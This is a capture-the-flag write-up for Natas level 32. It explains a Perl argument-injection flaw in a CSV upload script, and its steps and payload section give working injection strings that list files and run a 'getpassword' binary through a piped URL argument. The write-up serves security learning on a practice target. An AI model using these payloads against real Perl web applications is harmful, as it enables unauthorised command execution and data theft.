# 🧪 Natas 32

## 🎯 Objective
Obtain the password for **Natas 33**.

---

## 👀 Observation
- Website behaviour is very similar to Natas 31.
- A **CSV file upload** feature is provided.
- Backend again uses a **Perl script** to process uploaded data.
- Previous ARGV-based exploitation no longer works directly.
- Additional restrictions appear to be in place.

---

## 🚨 Vulnerability
**Type:**  
- Command Injection / Argument Injection (Perl input handling flaw)

**Root Cause:**  
Although the application attempts to fix the ARGV injection from Natas 31, it still 
**passes user-controlled input into a Perl execution context**.
The fix is incomplete, allowing attackers to abuse **Perl's special file handling behaviour** to 
execute unintended actions and read arbitary files.

---

## 🛠️ Exploitation Steps
1. Tested whether arguments passed via the URL are processed by the backend.
2. Injected a command to **list files** in the current directory:
   ```bash
   /index.pl?ls%20.%20|
   ```
3. Observed that the command executed successfully and returned output.
4. Identified an executble file named: `getpassword`
5. Executed the discovered file using another ARGV-based injection:
   ```bash
   /index.pl?./getpassword%20|
   ```
6. The script executed the binary.
7. The password for **Natas 33** was printed in the response.

---

## 💻 Key Payload / Command
**Multipart argument injection**:
```bash
Content-Disposition: form-data; name="file";

ARGV
```
**Enumerate files**:
```bash
/index.pl?ls%20.%20|
```
**Execute discovered binary**:
```bash
/index.pl?./getpassword%20|
```

---

## 📖 Key Takeaways
- Blocking uploads does **not** fix argument injection.
- ARGV injection can enable **full command injection**.
- File enumeration is often the key step before exploitation.
- Command injection does not always require `;` or `&&`.
  
---

## 🖼️ Screenshots 
<img width="1556" height="821" alt="image" src="https://github.com/user-attachments/assets/684a032c-c8bb-41ff-bff9-5c13ef102c1c" />
<img width="776" height="383" alt="image" src="https://github.com/user-attachments/assets/08495896-85a2-4660-afc3-e18dd3a17d54" /> <br>

*Password redacted for ethical reasons*
